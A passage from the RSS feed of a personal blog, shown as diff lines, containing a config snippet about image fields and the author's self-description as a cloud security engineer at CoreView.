+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;website&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;https://www.typescriptlang.org&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;ts-logo-128.jpg&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;image&lt;/code&gt; field accepts both local and external images.&lt;/p&gt;</description></item><item><title>Search</title><link>https://robertodandrea.com/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/search/</guid><description/></item><item><title>whoami</title><link>https://robertodandrea.com/whoami/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/whoami/</guid><description>&lt;p&gt;Hi, I’m Roberto D’Andrea, a passionate cybersecurity professional with hands-on expertise in securing cloud environments. Currently, I’m a Cloud Security Engineer at CoreView, where I dive deep into threat detection and incident response using powerful tools like Microsoft Sentinel and Defender XDR. Beyond just managing threats, I’m actively involved in shaping and enhancing CoreView’s platform security — hunting down vulnerabilities, rolling out robust defenses, and brainstorming new features to make our platform smarter and tougher against today’s evolving cyber risks.
+I’m dedicated to helping companies keep their valuable data safe and sound. Every day, I work to spot the hidden risks, stop cyber attacks before they happen, and ensure the cloud systems run seamlessly and securely. My goal is simple: protect what matters most so businesses can thrive without worrying about security. If you want someone who’s both tech-savvy and committed to making cybersecurity proactive and approachable, that’s me!&lt;/p&gt;</description></item></channel></rss>
